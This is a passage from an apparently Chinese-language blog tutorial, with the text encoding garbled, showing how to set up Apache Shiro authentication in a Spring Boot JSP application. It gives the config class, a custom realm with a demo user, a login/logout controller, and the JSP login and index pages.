åˆ›å»ºå®‰å…¨ç®¡ç†å™¨</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DefaultWebSecurityManager <span class="title">getDefaultWebSecurityManager</span><span class="params">(@Qualifier(<span class="string">"getRealm"</span>) Realm realm)</span></span>&#123;</span><br><span class="line">        DefaultWebSecurityManager defaultWebSecurityManager = <span class="keyword">new</span> DefaultWebSecurityManager();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç»™å®‰å…¨ç®¡ç†å™¨è®¾ç½®realm</span></span><br><span class="line">        defaultWebSecurityManager.setRealm(realm);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> defaultWebSecurityManager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3. åˆ›å»ºè‡ªå®šä¹‰realm</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Realm <span class="title">getRealm</span><span class="params">()</span></span>&#123;</span><br><span class="line">        CustomerRealm customerRealm = <span class="keyword">new</span> CustomerRealm();</span><br><span class="line">        <span class="keyword">return</span> customerRealm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>åŒæ—¶è¿˜éœ€è¦ä¸€ä¸ªshiro.realmsåŒ…æ¥è‡ªå®šä¹‰realm<br>CustomerRealm.java<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.shiro.realms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationException</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationToken</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.<span class="type">AuthorizationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.<span class="type">AuthorizingRealm</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.<span class="type">PrincipalCollection</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰Realm</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">CustomerRealm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthorizationInfo</span> doGetAuthorizationInfo(<span class="type">PrincipalCollection</span> principalCollection) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthenticationInfo</span> doGetAuthenticationInfo(<span class="type">AuthenticationToken</span> authenticationToken) <span class="keyword">throws</span> <span class="type">AuthenticationException</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æœ€åè¿è¡Œè®¿é—®ä¸€ä¸‹index.jsp è¦æ˜¯æˆåŠŸè·³è½¬åˆ°äº†login.jsp  é‚£å°±è¯æ˜index.jspç°åœ¨æ˜¯å—ä¿æŠ¤çš„äº†</p><h2 id="å®ç°è®¤è¯ä¸é€€å‡º"><a href="#å®ç°è®¤è¯ä¸é€€å‡º" class="headerlink" title="å®ç°è®¤è¯ä¸é€€å‡º"></a>å®ç°è®¤è¯ä¸é€€å‡º</h2><p>è¿™ä¸ªä¾‹å­å¹¶æ²¡æœ‰è¿æ¥æ•°æ®åº“ï¼Œä½¿ç”¨ä¸€ä¸ªå€¼æ¥è¿›è¡Œæ¼”ç¤º</p><p>ç”±äºconfigè‚¯å®šä¸èƒ½è¿›è¡Œç›´æ¥è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªcontroller<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.IncorrectCredentialsException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UnknownAccountException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.<span class="keyword">annotation</span>.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(<span class="meta-string">"user"</span>)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * é€€å‡ºç™»å½•</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(<span class="meta-string">"logout"</span>)</span></span><br><span class="line">    <span class="keyword">public</span> String logout()&#123;</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line">        subject.logout(); <span class="comment">//é€€å‡ºç™»å½•</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/login.jsp"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”¨æ¥å¤„ç†èº«ä»½éªŒè¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> username</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> password</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(<span class="meta-string">"login"</span>)</span></span><br><span class="line">    <span class="keyword">public</span> String login(String username,String password)&#123;</span><br><span class="line">        <span class="comment">//è·å–ä¸»ä½“å¯¹è±¡</span></span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            subject.login(new UsernamePasswordToken(username,password));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/index.jsp"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownAccountException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.<span class="keyword">out</span>.println(<span class="string">"ç”¨æˆ·åé”™è¯¯"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IncorrectCredentialsException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.<span class="keyword">out</span>.println(<span class="string">"å¯†ç é”™è¯¯"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/login.jsp"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åŒæ—¶ä¹Ÿè¦å»ä¿®æ”¹ä¸€ä¸‹Realm<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.shiro.realms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationException</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationToken</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">SimpleAuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.<span class="type">AuthorizationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.<span class="type">AuthorizingRealm</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.<span class="type">PrincipalCollection</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰Realm</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">CustomerRealm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthorizationInfo</span> doGetAuthorizationInfo(<span class="type">PrincipalCollection</span> principalCollection) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthenticationInfo</span> doGetAuthenticationInfo(<span class="type">AuthenticationToken</span> authenticationToken) <span class="keyword">throws</span> <span class="type">AuthenticationException</span> &#123;</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"====================================="</span>);</span><br><span class="line">        <span class="type">String</span> principal = (<span class="type">String</span>)authenticationToken.getPrincipal();</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"xiaochen"</span>.equals(principal))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="type">SimpleAuthenticationInfo</span>(principal,<span class="string">"123"</span>,<span class="keyword">this</span>.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Configä¹Ÿéœ€è¦è¿›è¡Œä¿®æ”¹<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.<span class="built_in">config</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.shiro.realms.CustomerRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.Realm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.spring.web.ShiroFilterFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ç”¨æ¥æ•´åˆShiroæ¡†æ¶çš„é…ç½®ç±»</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@Configuration</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroConfig</span> &#123;</span></span><br><span class="line">    <span class="comment">//1. åˆ›å»ºshiroFilter</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ShiroFilterFactoryBean <span class="title">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span></span>&#123;</span><br><span class="line">        ShiroFilterFactoryBean shiroFilterFactoryBean = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç»™filterè®¾ç½®å®‰å…¨ç®¡ç†å™¨</span></span><br><span class="line">        shiroFilterFactoryBean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//é…ç½®ç³»ç»Ÿå—é™èµ„æº</span></span><br><span class="line">        <span class="comment">//é…ç½®ç³»ç»Ÿå…¬å…±èµ„æº</span></span><br><span class="line">        Map&lt;<span class="keyword">String</span>,<span class="keyword">String</span>&gt; <span class="built_in">map</span> = <span class="keyword">new</span> HashMap&lt;<span class="keyword">String</span>,<span class="keyword">String</span>&gt;();</span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/user/login"</span>,<span class="string">"anon"</span>); <span class="comment">//anon è®¾ç½®ä¸ºå…¬å…±èµ„æº</span></span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/**"</span>,<span class="string">"authc"</span>);  <span class="comment">//authc è¯·æ±‚è¿™ä¸ªèµ„æºéœ€è¦è®¤è¯å’Œæˆæƒ</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//é»˜è®¤è®¤è¯ç•Œé¢è·¯å¾„</span></span><br><span class="line">        shiroFilterFactoryBean.setLoginUrl(<span class="string">"/login.jsp"</span>);</span><br><span class="line">        shiroFilterFactoryBean.setFilterChainDefinitionMap(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> shiroFilterFactoryBean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. åˆ›å»ºå®‰å…¨ç®¡ç†å™¨</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DefaultWebSecurityManager <span class="title">getDefaultWebSecurityManager</span><span class="params">(@Qualifier(<span class="string">"getRealm"</span>) Realm realm)</span></span>&#123;</span><br><span class="line">        DefaultWebSecurityManager defaultWebSecurityManager = <span class="keyword">new</span> DefaultWebSecurityManager();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç»™å®‰å…¨ç®¡ç†å™¨è®¾ç½®realm</span></span><br><span class="line">        defaultWebSecurityManager.setRealm(realm);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> defaultWebSecurityManager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3. åˆ›å»ºè‡ªå®šä¹‰realm</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Realm <span class="title">getRealm</span><span class="params">()</span></span>&#123;</span><br><span class="line">        CustomerRealm customerRealm = <span class="keyword">new</span> CustomerRealm();</span><br><span class="line">        <span class="keyword">return</span> customerRealm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¸Šé¢éƒ½æœ‰äº†ä¹‹åï¼Œå°±å¯ä»¥ä¿®æ”¹ä¸€ä¸‹index.jspå’Œlogin.jspäº†</p><p>index.jsp<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@page</span> <span class="attr">contentType</span>=<span class="string">"text/html;  UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span></span><br><span class="line"><span class="xml">          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>ç³»ç»Ÿä¸»é¡µV1.0<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageContext.request.contextPath&#125;</span><span class="xml"><span class="tag"><span class="string">/user/logout"</span>&gt;</span>é€€å‡ºç”¨æˆ·<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>ç”¨æˆ·ç®¡ç†<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>å•†å“ç®¡ç†<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>è®¢å•ç®¡ç†<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>ç‰©æµç®¡ç†<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>login.jsp<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@page</span> <span class="attr">contentType</span>=<span class="string">"text/html;  UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span></span><br><span class="line"><span class="xml">          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>ç™»é™†é¡µé¢<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageContext.request.contextPath&#125;</span><span class="xml"><span class="tag"><span class="string">/user/login"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        ç”¨æˆ·åï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">        å¯†ç ï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"ç™»å½•"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>è¿™æ ·å°±å®Œæˆäº†è®¤è¯å’Œé€€å‡º</p><p>æ€è·¯å¾ˆç®€å•ï¼Œå°±æ˜¯å†™ä¸€ä¸ªcontrolleræ§åˆ¶å™¨ï¼Œå»è·å–ä¸»ä½“subjectï¼Œå¹¶ä¸”è°ƒç”¨subjectä¸­çš„loginå’Œlogoutæ–¹æ³•å»å®ç°è®¤è¯å’Œé€€å‡ºï¼Œå¹¶ä¸”å®Œæˆä¸€ä¸‹é‡å®šå‘çš„æ“ä½œ</p><p>subjectå‘¢ä¼šè‡ªåŠ¨çš„æ³¨å…¥åˆ°realmçš„é…ç½®ä¸­ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨</p><p>è€Œrealmä¸­,ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œæ²¡æœ‰è¿æ¥æ•°æ®åº“å»è¿›è¡Œæ“ä½œï¼Œä½¿ç”¨äº†ä¸€ä¸ªå€¼å»æ¨¡æ‹Ÿç™»å½•å’Œé€€å‡º</p><p>è¿æ¥æ•°æ®åº“åªéœ€è¦å»æ›¿æ¢ä¸€ä¸‹å°±å¯ä»¥äº†</p><h2 id="è¿æ¥æ•°æ®åº“-MD5-Saltæ³¨å†ŒåŠŸèƒ½"><a href="#è¿æ¥æ•°æ®åº“-MD5-Saltæ³¨å†ŒåŠŸèƒ½" class="headerlink" title="è¿æ¥æ•°æ®åº“+MD5+Saltæ³¨å†ŒåŠŸèƒ½"></a>è¿æ¥æ•°æ®åº“+MD5+Saltæ³¨å†ŒåŠŸèƒ½</h2><p>MD5+Saltä¸ä»…æ˜¯ç”¨äºç”¨æˆ·è®¤è¯ï¼Œåœ¨ç”¨æˆ·æ³¨å†Œæ—¶å°±åº”è¯¥å»è¿›è¡Œä¸€ä¸‹MD5+Saltçš„æ“ä½œ</p><p>é¦–å…ˆè‚¯å®šæ˜¯è¦æœ‰ä¸ªæ³¨å†Œé¡µé¢äº†register.jsp<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@page</span> <span class="attr">contentType</span>=<span class="string">"text/html;  UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span 